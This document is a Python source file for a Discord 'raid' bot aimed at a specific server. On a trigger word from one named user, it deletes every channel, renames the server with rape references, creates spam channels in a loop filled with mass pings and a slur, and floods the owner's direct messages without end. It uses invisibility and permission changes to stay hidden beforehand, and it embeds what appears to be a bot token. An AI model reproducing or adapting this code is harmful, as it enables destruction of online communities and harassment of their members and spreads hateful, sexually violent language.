import discord
import io

targetGuildId = 454058863600074753
botChildrenId = [
465739288336793612
]
payload = '@everyone\n<@250803093049049089><@254683345735254016><@347507600541089793><@347735227055210496>\nhttps://media.giphy.com/media/PqXQV58Tva7DO/giphy.gif\nhttps://media.giphy.com/media/hLx1RYpEamdj2/giphy.gif\nhttps://media.giphy.com/media/xARspuzI2RZCw/giphy.gif\nhttps://media.giphy.com/media/11hEdGzcUswSEU/giphy.gif\nhttps://media.giphy.com/media/2qADsl3oMNtsc/giphy.gif\n**ITS SPAM TIME MY NI:b::b:AS**'
ownerPayload = 'yo ni:b::b:a, your server is under attack! You best fix it!'

bot = discord.Client()

@bot.event
async def on_ready():
    print('API Connected.')

    print('Setting hidden username and icon...')
    file = open('hidden.png', 'rb')
    await bot.user.edit(username='🏴-'""", avatar=file.read()""")

    print('Setting status to invisible...')
    await bot.change_presence(status=discord.Status.invisible)

    print('Finding target guild by ID...')
    guild = bot.get_guild(targetGuildId)
    if guild == None:
        print('Bot is not in target server, or it does not exist.')
        exit()
    print('Found guild named "' + guild.name + '".')

    print('Looking for child bots...')
    botChildren = []
    for childId in botChildrenId:
        child = guild.get_member(childId)
        if child == None:
            print('ERROR: child bot not found with ID: ' + childId)
            exit()
        else:
            botChildren.append(child)

    print('Hiding child bots...')
    for channel in guild.channels:
        for childBot in botChildren:
            await channel.set_permissions(childBot, read_messages=False)

    print('===== Ready for raid. Say "RAID" as Yamcha#4224 to rape this server. =====')
    def check(m):
        return ('RAID' in m.content) and m.author.id == 273940917596061698
    await bot.wait_for('message', check=check)

    print('================================')
    print('========== RAID START ==========')
    print('================================')

    print('Changing name and icon...')
    file = open('daddy.png', 'rb')
    await bot.user.edit(username='Daddy Squidward', avatar=file.read())

    print('Bringing bot online...')
    await bot.change_presence(status=discord.Status.online, activity=discord.Game('server gang-rape'))

    print('Setting server settings...')
    file = open('servericon.png', 'rb')
    await guild.edit(name='Squidward\'s Rape Vault', icon=file.read(), reason='===== BEGIN RAID =====')

    print('Deleting channels...')
    for channel in list(guild.channels):
        await channel.delete(reason='Deleting cancerous memes')

    print('Creating channels and starting spam...')
    channelAdd = True
    while channelAdd:
        try:
            newchannel = await guild.create_text_channel('spam-time-bitches')
            await newchannel.send(payload)
        except:
            channelAdd = False

    print('Raid is now at full speed.')

    print('Spamming server owner\'s DM\'s...')
    while True:
        await guild.owner.send(ownerPayload)

@bot.event
async def on_message(message):
    if message.author.bot and message.mentions_everyone:
        await message.channel.send(payload)

bot.run('NDY1NzM0MTY5ODA1MzI0MzI5.DiR0Rg.Jcu1mGIxLHL' + 'pZ69M0mLfTo3vAoM')
